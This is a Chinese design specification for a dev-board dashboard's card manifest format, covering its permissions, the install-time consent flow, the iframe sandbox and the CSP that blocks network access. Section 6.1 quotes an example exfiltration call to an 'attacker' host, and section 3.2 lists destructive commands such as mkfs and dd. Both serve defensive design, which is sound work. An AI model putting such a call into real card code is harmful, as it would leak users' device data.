> **来源与修订**：本文自前身工程 `DevBoardConsole\docs\spec\` 迁入（2026-11-12，Codex，提交 `c24b084`）。
> 契约层为**权威文档**。**迁入后经 `0244852` 修订过**，2026-11-12 的评审又做了一轮修订
> ——逐节来源见 `00-overview.md` §一之二。落地方式见 `docs/04-架构设计.md`。
# 卡片 manifest 格式

> 一张卡 = 一个目录。`manifest.json` 声明它是什么、读什么、写什么。
> 卡片即文件：放进目录就生效，改完热插拔。这是 AI 最擅长编辑的东西。

---

## 一、一个 manifest 长什么样

```json
{
  "apiVersion": "devboard/v1",
  "kind": "Card",

  "id": "cpu-usage",
  "name": "CPU 占用率",
  "version": "1.0.0",
  "description": "显示 CPU 总占用与每核占用",

  "entry": "index.html",

  "requires": {
    "tags": ["cpu.usage", "cpu.core.*.usage"],
    "actions": [],
    "min_board_pack": ">=1.0.0"
  },

  "layout": {
    "w": 3, "h": 2,
    "min_w": 2, "min_h": 1
  },

  "permissions": {
    "read": ["cpu.usage", "cpu.core.*.usage"],
    "write": []
  },

  "actions": []
}
```

---

## 二、逐字段

| 字段 | 必填 | 含义 |
|---|---|---|
| `apiVersion` | 是 | 契约版本 |
| `id` | 是 | 卡片的稳定标识，全局唯一 |
| `name` | 是 | 人类可读名 |
| `version` | 是 | 卡片自己的版本 |
| `entry` | 是 | 入口 HTML，相对于卡片目录 |
| `requires.tags` | 否 | 这张卡**想**读的 tag。用于依赖检查与降级提示 |
| `requires.actions` | 否 | 这张卡**想**触发的动作 |
| `requires.min_board_pack` | 否 | 最低板型包版本要求 |
| `layout` | 否 | 栅格尺寸与最小尺寸 |
| `permissions.read` | 是 | 这张卡被允许读的 tag。**超出此列表的读取一律拒绝** |
| `permissions.write` | 是 | 这张卡被允许触发的动作 id。**超出此列表一律拒绝** |
| `actions` | 否 | 卡片自己声明的**视图内动作**（见 §五） |

### 2.2 模式的包含关系

两个字段都支持**模式**，所以「requires ⊆ permissions」不是字符串相等，而是
**模式覆盖**：

> `requires` 里的每一项，必须被 `permissions` 里的**某一项**覆盖。

```
requires:   ["cpu.core.3.usage"]
permissions: ["cpu.core.*.usage"]     ← 覆盖，成立
```

这条规则让卡片既能声明精确需求，又能申请一个更宽的权限范围。反过来
（`requires` 宽、`permissions` 窄）是不成立的。

**注意这条规则的代价**：一张卡如果声明 `cpu.core.*.usage`，它就获得了所有核的读权限。
这没问题——读权限本身是低风险的，而且语义 tag 契约保证了它读不到别的板子的东西。

### 2.3 `permissions.write` 不支持模式

`permissions.read` 支持模式，`permissions.write` **只支持精确的动作 id**。

理由是**不对称的风险**：读一个 `cpu.usage` 没有副作用；写一个动作会改板子。
模式让授权范围变大，对读来说方便，对写来说危险。

所以 `permissions.write: ["backlight.*"]` 是**非法**的，校验器报错。

`requires.actions` 同理用精确 id（动作 id 本身不带通配约定）。

### 2.4 实际生效的写权限

真正决定「能不能执行」的，是**两个集合的交集**：

```
有效写权限 = permissions.write ∩ 已授权的动作
```

`permissions.write` 是 manifest 说的，**已授权**是用户点过头的。
只有两个都有的动作才能执行。

这条规则让「用户只批准了其中一部分动作」有意义——否则用户点过头也没用。

### 2.5 manifest 的 schema 是封闭的

**未知字段一律报错**，在**每一层**。

这和板型包是同一条规则，理由也一样：被静默忽略的字段，就是拼错的字段。

```
"permissions": { "read": [...], "write": [...], "network": true }
                                       ^^^^^^^^ 报错，不是忽略
```

这条规则是 §六「v1 没有 `permissions.network`」这条承诺的**执行者**。
没有它，一张卡可以声明一个运行时看不懂的字段，然后以为自己有网络——
而实际上它没有，或者更糟，运行时按别的方式处理了它。

| 层 | 封闭 |
|---|---|
| 顶层 | 是 |
| `requires` | 是 |
| `permissions` | 是 |
| `layout` | 是 |
| `actions[]` | 是 |

---

## 三、权限模型

### 3.1 为什么是两层

卡片跑在沙箱里（iframe + 白名单 API），但「沙箱」只保证卡片**搞不垮工作台**，不保证卡片**不会乱动板子**。

两件事必须分开：

| 防护 | 防的是什么 | 手段 |
|---|---|---|
| 代码沙箱 | 坏卡搞垮工作台、偷读宿主机文件 | iframe + 白名单 API + 无 Node 集成 |
| 动作权限 | 卡片乱写板子 | `permissions.write` + 分级 + 安装时授权 |

一张卡能读 `cpu.usage` 是**读**，不危险。能写 `/sys/...` 是**写**，要授权。读权限用 tag 名声明，写权限用动作 id 声明——动作 id 比 tag 名更粗，所以写权限天然更严格。

### 3.2 分级

沿用板型包那**两档**（`reversible` / `destructive`），卡片侧只声明
「我要用哪一档的动作」——具体哪一档由**板型包**说了算（§5.1），
卡片只声明「我要用这个动作」：

```json
"permissions": {
  "read": ["cpu.usage"],
  "write": ["backlight.set"]
}
```

> **只有两档。** 早期版本写过三档（`read` / `reversible` / `destructive`），
> 与 `spec/02` §4.2 冲突，已按契约口径统一：**只读走 tag，不是一种动作**。

授权流程：

1. 安装卡片时，扫描 `permissions.write` 里每个动作，取它在新板型包里的 `danger` 等级。
2. `reversible` → 问一次「这张卡可以改背光亮度，允许吗」，记住选择。
3. `destructive` → 问一次，**且每次执行都要二次确认**。

**危险等级还要过一道地板**（`02-board-pack.md` §5.2）。板型包把某个动作声明成
`reversible`，但它的命令命中了地板（`reboot`、`mkfs`、`dd` 到块设备……），
那它按 `destructive` 处理。

这一条对卡片和 agent 都一样：**没有人能绕过人的确认**。

授权是**按动作**的。装一张卡不等于装上它所有动作的权限；用户可以只允许其中一部分。

授权记录存在本地，绑定 `(卡片 id, 动作 id, 板型包 id)`。换一块板（不同 pack）要重新授权——
因为新板上的同名动作可能语义不同。

**授权界面上必须显示参数范围。** 动作在板型包里可以声明 `guard`
（`02-board-pack.md` §5.5），那是「温和参数域」。批准界面显示的不是动作名，
而是「**这张卡可以把背光亮度改到 16–255**」这样的具体范围。
运行时执行前检查参数是否落在 `guard` 内：落在里面直接执行，
超出则报 `needs_confirmation`，走一次单独确认（`04` §2.4）。

> **为什么必须显示范围**：用户批准「可以改背光」时，脑子里想的是「调到 30」，
> 实际拿到的是 `0..255` 全域，包括把屏幕调到全黑。
> `guard` 让「批准」这句话有确切所指；它只能缩小范围，不能扩大（校验规则 22）。

**只读不是动作。** 只读走 tag，`permissions.read` 不需要授权流程——读一个
`cpu.usage` 没有副作用，不需要问用户。板型包里也没有 `danger: readonly` 的动作：
动作一律是写。

### 3.3 卡片不能自己提权

卡片**不能**在运行时请求新权限。权限只在安装时确定。卡片想要更多，只能提示用户重新安装
（带新 manifest）。

**改 manifest 会重新征求授权。** 卡片被热重载时，如果 manifest 的 `permissions.write`
变了（新增或删除动作），运行时**必须**重新走一遍授权流程，而不是沿用旧的授权。
理由：一张卡可以在两次热重载之间把危险动作加进来。

这条规则和「卡片即文件」不冲突——热重载是开发时的便利，重新征求授权是安全底线，
后者优先。实现上可以是「重载后若权限集变了，弹一次确认」。

---

## 四、读侧：卡片怎么拿数据

卡片不直接碰连接层。运行时给它一个**受控 API**：

```js
// 在卡片 iframe 内可用
const value = await cockpit.tags.get("cpu.usage");
// => { value: 37.2, unit: "percent", status: "ok", at: 1762910000123 }

cockpit.tags.subscribe("cpu.usage", (v) => { /* 每次刷新 */ });
```

运行时保证：

- 只返回 `permissions.read` 里列出的 tag
- 返回的是**状态化**的值（§`01` 的五态），不是裸数字
- 订阅是**按 reader 刷新周期**推送，不是卡片自己轮询

**卡片不能自己轮询。** 卡片自己轮询 = 每张卡各自 fork 一个 adb shell = 板子看起来 100% 忙，而且 N 张卡时负载翻 N 倍。运行时是唯一的轮询者，卡片是订阅者。

> **本节与 §七 讲的是同一件事。** 完整的 API 清单、签名与错误语义在 §七，
> 那里是**唯一**的定义处；本节只保留三句原则，避免同一套 API 有两份描述。
> （历史上这里与 §七 是两段一字不差的拷贝，改一处忘一处就会漂移。）

---

## 五、写侧：控制闭环

### 5.1 卡片声明的控制

```json
"actions": [
  {
    "id": "toggle-npu",
    "label": "NPU 接入开关",
    "target": "npu.pipeline.toggle",
    "params": { "enabled": { "type": "boolean" } }
  }
]
```

`actions[]` 里每一项的字段：

| 字段 | 必填 | 含义 |
|---|---|---|
| `id` | 是 | 卡片内的动作 id，全局唯一（卡片自己的命名空间） |
| `label` | 是 | 人类可读名 |
| `target` | 否 | 板型包里的动作 id。**有 = 板型动作**，无 = 视图内动作 |
| `params` | 否 | 参数 schema，结构与板型包的 `params` 一致（`02` §4.3） |

**`target` 有无决定这个动作的类别**：

| | 视图内动作（无 `target`） | 板型动作（有 `target`） |
|---|---|---|
| 是什么 | 卡片内部的一次操作 | 板子接受的一次写入 |
| 例 | 切换图表的显示模式 | `backlight.set` |
| 权限 | **不需要**授权（不碰板子） | 需要（§3.2） |
| `danger` / `readback` | 不适用 | 由**板型包**说了算 |
| 校验 | §九 规则 12 | §九 规则 7（`target` 必须在 `permissions.write` 里） |

**卡片不声明 `danger`。** 危险等级由**板型包**说了算——板子知道「重启自己是破坏性的」，
卡片不知道。卡片的 `danger` 字段如果存在，会被校验器拒绝（schema 封闭，§2.5）。

同样，卡片不声明 `readback`——回读由板型包的动作定义，运行时按板型包的来。
卡片声明自己的 `readback` 会和板型包冲突，而**板型包赢**，因为它是离板子最近的那一层。

> **这条曾经自相矛盾**：早期版本既说「视图内动作不需要授权」，
> 又在校验规则里要求 `actions[].target` 必须出现在 `permissions.write`——
> 于是视图内动作被迫去授权一个它根本没有的板型动作。
> 现在的规则是按 `target` 有无分流，两种动作各走各的校验。

### 5.2 闭环的四步

卡片里的开关按钮，完整流程：

```
用户点击
   ↓
卡片调 cockpit.actions.invoke("toggle-npu", {enabled: true})
   ↓
运行时检查：① 该动作在 permissions.write 里吗？
           ② 该动作的 danger 等级需要二次确认吗？
           ③ 参数落在该动作的 guard 域内吗？（超出则同样要确认）
           ④ 板型包里这个动作存在吗？
   ↓
执行命令 → 回读 readback
   ↓
把「回读到的真实状态」回给卡片
   ↓
卡片按回读值渲染按钮（不是按用户点了什么）
```

**回读是强制的。** 运行时在动作执行后按 `readback` 取值，把这个值作为动作结果返回。卡片**必须**用返回值渲染，不能自己乐观更新。

```js
const r = await cockpit.actions.invoke("toggle-npu", { enabled: true });
// r = { ok: true, readback: { value: true, status: "ok" } }
button.setState(r.readback.value);   // 用回读值
```

### 5.3 回读失败

命令返回了，但状态没变（比如板子上的服务没起来）：

```js
// r = { ok: false, reason: "readback_mismatch", expected: true, actual: false }
```

卡片应该显示「命令已发出，未确认生效」，并保留实际值。**不允许显示成已开启。**

这就是「驾驶舱」和「遥控器」的分界线——遥控器按你按了按钮来显示，驾驶舱按板子实际在做什么来显示。

### 5.4 视图内动作 vs 板型动作

见 §5.1 的对照表（两类动作按 `target` 有无分流）。

---

## 六、沙箱

卡片跑在 iframe 里。

| 规则 | 内容 |
|---|---|
| 位置 | 独立 iframe，`sandbox="allow-scripts"`（**不给** `allow-same-origin`） |
| API | 只有 `cockpit.*` 白名单方法 |
| 网络 | **禁**。由宿主注入 CSP 关闭（§6.1），且 v1 无法申请。要联网必须升契约版本 |
| 存储 | 只能写卡片自己的命名空间（布局、偏好），经 `cockpit.storage.*` 走（§6.2） |
| 文件 | 不可读写宿主机文件系统（除卡片目录内的相对资源与 §6.2 的存储接口） |
| 崩溃 | 单卡崩溃不影响其他卡，也不影响工作台 |

**v1 没有 `permissions.network` 之类的字段。** 没声明就是没有——这条规则不需要字段来
表达，因为卡片**无法**声明它。

这不是省事，是一个明确的取舍：**一张 AI 写的卡片，如果能随便联网，它就能把用户板子上的
数据发到任何地方。** v1 宁可让卡片什么都做不了，也不给这个口子。

真要放开，需要：

1. 契约升版本，加一个显式的字段；
2. 安装卡片时**单独**征求授权（不和动作授权混在一起）；
3. 授权绑定到具体的域名，不是「允许联网」。

**卡片的沙箱和宿主的进程模型是两件事。** 卡片跑在 iframe 里，需要一个内嵌的网页运行时
（Electron 的 `<webview>` / `BrowserView`、或系统 WebView2 都行）；这不改变契约本身，
但**会**影响「宿主怎么实现」的选择。本轮规格不锁这一点。

**这条沙箱选择带来两件必须写下来的事**（2026-11-14，ADR-D28）：

1. **卡片之间互不可见**。每个 iframe 是一个**独立的不透明源**——它们彼此不同源，
   谁也读不到谁的 DOM、存储与 cookie。
   （因此也**碰不到宿主的存储**：卡片的 `localStorage` 直接抛 `SecurityError`，
   这就是 §6.2 要宿主代管存储的**前提**，不是将就。）
2. **preload 进不了 iframe**。宿主的 preload 只挂在窗口上，**子 iframe 里没有**——
   所以 `cockpit.*` **不能**靠 `contextBridge` 递进去，
   **必须**由宿主**注入一个 bridge 脚本**（同源提供）来实现（§7.7）。

### 6.1 网络怎么真的被关掉

**`sandbox` 属性不限制网络。** 不给 `allow-same-origin` 只是让卡片拿不到宿主的源、
DOM 与存储；卡片在自己的不透明源里照样能 `fetch('https://attacker/?d=' + data)`、
`new WebSocket(...)`、`navigator.sendBeacon(...)`、`<img src="https://...">`。

所以「v1 无网络」这条承诺必须由**宿主**执行，具体是**注入 CSP 响应头**：

```
Content-Security-Policy:
  default-src 'none';
  script-src 'self';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data:;
  font-src 'self' data:;
  connect-src 'none';
  form-action 'none';
  frame-src 'none';
  base-uri 'none';
```

| 指令 | 值 | 为什么 |
|---|---|---|
| `default-src` | `'none'` | 默认全禁，逐项放开 |
| `script-src` | `'self'` | 卡片只能跑自己目录里的脚本 |
| `connect-src` | `'none'` | **禁掉 `fetch` / `XHR` / `WebSocket` / `EventSource`** |
| `img-src` | `'self' data:` | 只允许本地与内联 data:，断掉 `<img>` 外传通道 |
| `form-action` / `frame-src` / `base-uri` | `'none'` | 断掉表单外传、嵌套 frame、`<base>` 改写 |

**CSP 是契约的一部分**：宿主**必须**注入它，卡片**不能**覆盖它
（`connect-src` 不可被卡片放宽）。CSP 由宿主在响应 `cockpit://card/...` 时注入，
不是卡片目录里的 `meta` 标签——`meta` 里的 CSP 无法限制它自己，
且卡片可以删掉它。

**违反 CSP 时的表现**：浏览器的 CSP 违规会记在卡片运行时日志里（`04` §2.3 的
`get_card_runtime_log` 可见），agent 因此能看到「这张卡试图联网」。

### 6.2 存储怎么兑现

契约承诺「卡片只能写卡片自己的命名空间」，但在不给 `allow-same-origin` 的 iframe 里，
`localStorage` / `sessionStorage` / `IndexedDB` **全部抛 `SecurityError`**
（不透明源没有存储）。所以存储必须由**宿主代管**，经白名单 API 访问：

| 方法 | 签名 | 说明 |
|---|---|---|
| `cockpit.storage.get(key)` | `→ Promise<any>` | 读自己命名空间下的一个键；不存在返回 `undefined` |
| `cockpit.storage.set(key, value)` | `→ Promise<void>` | 写一个键。`value` 必须是 **JSON 可序列化**的 |
| `cockpit.storage.remove(key)` | `→ Promise<void>` | 删一个键 |
| `cockpit.storage.keys()` | `→ Promise<string[]>` | 列出自己命名空间下的全部键 |
| `cockpit.storage.clear()` | `→ Promise<void>` | 清空自己命名空间 |

**规则**：

| 项 | 规则 |
|---|---|
| 命名空间 | 每张卡一个，按 `卡片 id` 隔离。卡片**只能**看自己的 |
| 落盘位置 | 宿主数据目录下 `cards/<card-id>/storage.json`，由宿主写入 |
| 值类型 | 只能是 JSON 可序列化的值（字符串、数字、布尔、null、数组、对象） |
| 单键上限 | 64 KB；命名空间总量上限 1 MB。超出报 `quota_exceeded` |
| 键名 | 不得以 `__` 开头（保留给宿主） |
| 生命周期 | 卡片卸载时**保留**数据（重新装回来还在），除非用户显式清除 |
| 隔离 | 卡片之间互不可见；宿主不读卡片的业务数据，只保证隔离与配额 |

**卡片拿不到宿主的存储。** 卡片连 `localStorage` 都碰不到（不透明源），
能碰到的只有上面这五个方法。

**「布局存储的受控接口」就是这一套。** 早期版本在 §六 提过这个短语却从未定义它，
现在它有了明确的落点：`cockpit.storage.*`。

### 6.3 卡片可依赖的 CSS 变量

卡片**不得硬编码颜色**（与上面「网络 / 存储 / 文件」同一个原则）：
它只能用**宿主注入的 CSS 变量**。而**宿主到底注入哪些变量，是契约**——

```
--cockpit-bg / --cockpit-bg-elevated / --cockpit-border
--cockpit-text / --cockpit-text-dim / --cockpit-text-faint
--cockpit-accent / --cockpit-accent-2
--cockpit-ok / --cockpit-warn / --cockpit-danger / --cockpit-unavailable
--cockpit-radius / --cockpit-font-mono / --cockpit-font-ui
```

| 规则 | 内容 |
|---|---|
| **名字与含义是契约** | 卡片可以依赖上面这 15 个；**改名要升 `apiVersion`** |
| **值不是契约** | 值由宿主按皮肤给出（暗色 / 浅色各一套）。两套皮肤都必须提供**全部 15 个** |
| **宿主可以再加** | 实现可以提供更多变量，但**卡片不能依赖没写在这里的** |
| **语义色对应 tag 五态** | `--cockpit-ok` / `--cockpit-warn` / `--cockpit-danger` / `--cockpit-unavailable` 是**有含义的**：`unavailable` 表达的是「**这块板不提供这个能力**」，读不到就等于把「不可用」说成了「正常」 |

> **为什么清单要进契约**：卡片是 AI 写的，它需要一份「**可以依赖什么**」的清单，
> 否则换个宿主版本就得靠猜——而它不会猜，**它会硬编码**。
> 形状与取值见 `docs/UI设计/01-UI设计总纲.md` §7.2 与 §7.3。

---

## 七、卡片 API

卡片不直接碰连接层。运行时给它一个**受控 API**：

```js
// 在卡片 iframe 内可用
const value = await cockpit.tags.get("cpu.usage");
// => { value: 37.2, unit: "percent", status: "ok", at: 1762910000123 }

cockpit.tags.subscribe("cpu.usage", (v) => { /* 每次刷新 */ });
```

### 7.1 读

| 方法 | 说明 |
|---|---|
| `tags.get(name)` | 取一个 tag 的当前值 |
| `tags.subscribe(name, cb)` | 订阅一个 tag 的后续值 |
| `tags.subscribePattern(pattern, cb)` | 订阅一个模式，如 `cpu.core.*.usage` |
| `tags.list()` | 列出当前可读的全部 tag 及其状态 |

运行时保证：

- 只返回 `permissions.read` 里列出的 tag（模式按模式匹配，见 §2.2）
- 返回的是**状态化**的值（`01` 的五态），不是裸数字
- 订阅是**按 poll group 的刷新周期**推送，不是卡片自己轮询

**关于模式订阅**：卡片的 `requires` 里写的是模式（`cpu.core.*.usage`），
因为「每核占用率」这个概念不关心有几核。所以订阅也支持模式，
实例出现时逐个推给卡片（`cpu.core.7.usage` 在 8 核板上出现时）。

### 7.2 降级信号

卡片怎么知道某个 tag 缺失？三种信号，都要有：

| 信号 | 用途 |
|---|---|
| `tags.get(name)` 返回 `status: "unavailable"` | 主动查 |
| `tags.subscribePattern` 不再推这个实例 | 该实例消失 |
| `cockpit.degradation()` | 列出这张卡所有缺失/降级的 tag 及原因 |

第三种是给「卡片要在界面上写『不可用 · 缺 cpu.usage』」用的。

### 7.3 写

```js
const r = await cockpit.actions.invoke("toggle-npu", { enabled: true });
// r = { ok: true, readback: { value: true, status: "ok" } }
```

见 §五。

### 7.4 存储

见 §6.2。五个方法：`get` / `set` / `remove` / `keys` / `clear`。

### 7.5 日志

| 方法 | 签名 | 说明 |
|---|---|---|
| `cockpit.log(level, message)` | `level ∈ {error, warn, info}` | 写一条卡片运行时日志 |

卡片运行时日志就是 agent 的「自测眼睛」（`04` §1.2），
`get_card_runtime_log(cardId)` 能读到卡片写的这些条目。
所以 `log` 必须存在，且**卡片能写**。

### 7.6 通知

| 方法 | 签名 | 说明 |
|---|---|---|
| `cockpit.notify(title, body)` | — | 在宿主弹一条轻量通知（不要求用户回应） |

通知**不能**用来代替动作确认。`destructive` 动作的确认必须走 §5.2 那条路
（人在 GUI 里点，agent 只是重试），卡片不能自己弹一个「确定吗」来给自己放行。

---

## 7.7 API 全集（一张表）

这是**唯一**的 API 定义处。§四 与 §7.1–7.6 讲的都是它。

| 方法 | 类别 | 权限来源 |
|---|---|---|
| `cockpit.tags.get(name)` | 读 | `permissions.read` |
| `cockpit.tags.subscribe(name, cb)` | 读 | `permissions.read` |
| `cockpit.tags.subscribePattern(pattern, cb)` | 读 | `permissions.read` |
| `cockpit.tags.list()` | 读 | `permissions.read` |
| `cockpit.degradation()` | 读 | 无（只返回本卡的降级信息） |
| `cockpit.capabilities()` | 读 | 无（只返回本宿主的信息） |
| `cockpit.actions.invoke(id, params)` | 写 | `permissions.write` |
| `cockpit.storage.get/set/remove/keys/clear` | 存储 | 无（限于本卡命名空间） |
| `cockpit.log(level, message)` | 日志 | 无 |
| `cockpit.notify(title, body)` | 通知 | 无 |

**命名前缀统一为 `cockpit.*`**，方法名用小驼峰。
（`docs/05` 的 ADR-D6 曾列过另一套名字 `getTag / subscribeTag / setAction / log / notify / listTags`，
现已废弃——那张表指向本文。）

**所有方法都不抛异常**：失败时返回 `{ ok: false, reason }`
（与 `04` §四 的共同约定一致）。`tags.get` 例外——它返回一个**状态化**的值，
读不到时是 `{ value: null, status: "unavailable" }`，不是异常。

**本宿主没有实现的方法**，调用返回 `{ ok: false, reason: 'unknown_method' }`
（2026-11-14，ADR-D28）。`unknown_method` **不进** `01` §2.1.1 的 tag reason 表——
那张表是**读数**的原因码；这里说的是**方法不存在**。
卡片想知道宿主支持什么，**先问 `capabilities()`**：

```js
const caps = await cockpit.capabilities();
// { apiVersion: 'devboard/v1',
//   methods: ['capabilities', 'tags.get', 'tags.subscribe', …],
//   connection: { label: '板子 · ADB', transport: 'adb' },
//   tags: ['cpu.usage', 'mem.usage', …] }   ← 本卡**可读**的那些
```

| 字段 | 内容 |
|---|---|
| `apiVersion` | 契约版本 |
| `methods` | **本 build 实际实现的方法名**（不是契约全集） |
| `connection` | 当前连接上下文（**不含 `connectionId`**——卡片代码里没有这个词，见 §7.8） |
| `tags` | **本卡可读**的 tag 清单（已按 `permissions.read` 过滤） |

> **为什么要有它**：卡片是 AI 写的，它**必须知道宿主支持什么**——
> 否则它只能硬编码假设「`cockpit.tags.get` 一定在」，宿主版本一换就靠 try/catch 猜，
> 而卡片跑在沙箱里，**猜错了没有任何提示**。

### 7.8 连接上下文（隐式作用域）

**卡片 API 以宿主注入的连接上下文为隐式作用域。**

| 项 | 规则 |
|---|---|
| tag 名 | 在卡片 API 内**始终是不带连接前缀的全局名**（`cpu.usage`，不是 `board1.cpu.usage`） |
| 上下文来源 | 卡片**实例**的 connectionId，由宿主在 iframe 创建时注入 |
| 绑定发生处 | **布局层**：布局单元记录 `(cardId, connectionId)` |
| manifest | **不携带连接**——卡片声明的是能力，不是去向 |

**为什么**：一张卡可以在多个连接上各有一个实例，共享同一份代码目录与授权。
卡片代码里没有 `connectionId` 这个词——宿主负责把「这个实例看哪块板」翻译成
TagStore 里的 `(connectionId, tag)` 查找。

**多板前缀问题（`docs/05` O11）因此被隔离在宿主的解析层**：
将来支持多板时，前缀只出现在宿主内部，永远不进卡片 API 与 manifest。

---

## 八、目录布局

```
cards/
  cpu-usage/
    manifest.json
    index.html
    card.js            # 可选
    style.css          # 可选
  npu-control/
    manifest.json
    index.html
```

一个目录一张卡。`entry` 指向入口文件，其余文件由卡片自己按需加载（同目录，相对路径）。

---

## 九、校验清单

`validate_card(path)` 必须检查：

| # | 规则 |
|---|---|
| 1 | `apiVersion` 是已知版本 |
| 2 | `id` 全局唯一，不与已装卡片冲突 |
| 3 | `requires` ⊆ `permissions`（愿望不得超出授权，按模式覆盖判定，§2.2） |
| 4 | `permissions.read` 里每个 tag 名**匹配核心词表**或落在 `custom.*` 下 |
| 5 | `permissions.write` 里每个动作 id 在**当前连接的板型包**里存在（连不上板时跳过此检查，标注「未验证」） |
| 6 | `permissions.write` 里**不允许通配符**（§2.3） |
| 7 | `actions[]` 里**有 `target` 的**，其 `target` 必须在 `permissions.write` 里 |
| 8 | `layout.w/h` 在合法范围，`min_w/min_h` ≤ `w/h` |
| 9 | `entry` 文件存在 |
| 10 | manifest 是合法 JSON，**每一层都没有未知字段**（防止拼错字段被忽略，§2.5） |
| 11 | 卡片**不声明** `danger` / `readback`（那两样归板型包管，§5.1） |
| 12 | `actions[]` 里**没有 `target` 的**是视图内动作，它**不得**出现在 `permissions.write` 里 |
| 13 | `actions[].params` 的 `type` 必须是封闭取值（`02` §4.3）；`string` 必须有 `maxLength` |

